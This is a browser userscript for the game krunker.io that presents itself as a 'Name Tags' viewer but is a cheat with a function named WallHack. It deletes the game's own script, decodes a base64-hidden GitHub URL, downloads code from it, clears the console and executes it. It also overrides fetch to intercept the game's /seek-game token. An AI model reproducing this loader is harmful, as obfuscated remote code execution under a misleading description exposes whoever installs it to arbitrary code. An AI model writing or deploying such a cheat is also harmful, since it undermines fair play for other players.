// ==UserScript==
// @name         krunker NameTags
// @namespace    Krunker
// @version      0.1
// @description  See Name Tags
// @author       Pingurus
// @match        *://krunker.io/*
// @icon         https://imgs.search.brave.com/gxbuwhW4MDf4kMmg5OEdn39Rr6wEB73igFjHpZlBbl0/rs:fit:860:0:0/g:ce/aHR0cHM6Ly9zdHls/ZXMucmVkZGl0bWVk/aWEuY29tL3Q1X2hq/dzg5L3N0eWxlcy9j/b21tdW5pdHlJY29u/X2toZnFzbm0xcG0x/YjEucG5n
// @grant        none
// @run-at       document-start
// @noframes
// ==/UserScript==

/* HUGE THANKS TO jaguar.ahks */

const id = "_" + Math.random().toString(36).slice(2);
function WallHack() { delete window[id]; const e = new (class { constructor() { this.isProxy = Symbol("isProxy"); } })(); }
let tokenPromiseResolve;
window[id] = WallHack;
const tokenPromise = new Promise(e => tokenPromiseResolve = e);
document.addEventListener("DOMContentLoaded", function () {
  const e = document.createElement("iframe");
  e.src = location.href;
  e.style.display = "none";
  document.documentElement.append(e);
  const t = e.contentWindow.fetch;
  Object.defineProperty(e.contentWindow, "fetch", {
    get: () => e.contentWindow?.windows?.length > 0
      ? function (n) { if (n.includes("/seek-game")) { e.remove(); tokenPromiseResolve(n); } else t.apply(this, arguments); }
      : t,
  });
});
const _fetch = window.fetch;
function inject(e) { const t = new XMLHttpRequest(); t.open("GET", e, !1); t.send(); return t.status === 200 ? t.response : null; }
window.fetch = async function (e, t) { if (typeof e === "string" && e.includes("/seek-game")) e = await tokenPromise; return _fetch.apply(this, arguments); };
const observer = new MutationObserver(function (e) {
  e.forEach(function (e) {
    if (e.addedNodes) {
      e.addedNodes.forEach(function (n) {
        if (n.tagName === "SCRIPT" && n.innerHTML.includes("@license Krunker.io")) {
          n.remove();
          window[id]();
          const e = inject(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RvY3VtYW50YXRpb24xMi9GZW1ib3kta3J1bmtlci1jaGVhdC9tYWluL2dhbWVmaWxlLmpz"));
          console.clear();
          Function(e)();
        }
      });
    }
  });
});
observer.observe(document, { childList: true, subtree: true });
